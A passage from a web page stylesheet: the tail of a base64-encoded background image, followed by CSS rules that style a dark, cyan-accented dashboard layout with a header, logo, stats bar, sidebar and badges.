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') center/cover no-repeat;
  opacity:.07;pointer-events:none;z-index:0;
  filter:saturate(0.4)}
body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,212,255,.007) 3px,rgba(0,212,255,.007) 4px);pointer-events:none;z-index:9999}
header{border-bottom:1px solid var(--border);padding:16px 24px;display:flex;align-items:center;justify-content:space-between;background:linear-gradient(180deg,rgba(0,212,255,.04) 0%,transparent 100%);position:relative;z-index:2}
.logo{font-family:'Orbitron',monospace;font-size:1.05em;font-weight:900;color:var(--cyan);letter-spacing:4px;text-shadow:0 0 20px rgba(0,212,255,.4)}
.logo span{color:var(--dim2);font-weight:400}
.hstats{display:flex;gap:18px;font-size:0.80em;color:var(--dim2);letter-spacing:1px}
.hstats b{color:var(--cyan)}
.app{display:grid;grid-template-columns:290px 1fr;min-height:calc(100vh - 53px);position:relative;z-index:1}
aside{border-right:1px solid var(--border);background:var(--panel);display:flex;flex-direction:column;position:sticky;top:53px;height:calc(100vh - 53px);overflow:hidden}
.sb-top{padding:12px 14px;border-bottom:1px solid var(--border)}
.sb-title{font-family:'Orbitron',monospace;font-size:0.80em;letter-spacing:3px;color:var(--dim2);text-transform:uppercase;margin-bottom:10px;display:flex;align-items:center;justify-content:space-between}
.badge{background:rgba(0,212,255,.1);color:var(--cyan);border:1px solid rgba(0,212,255,.3);padding:1px 7px;border-radius:3px;font-size:.9em}
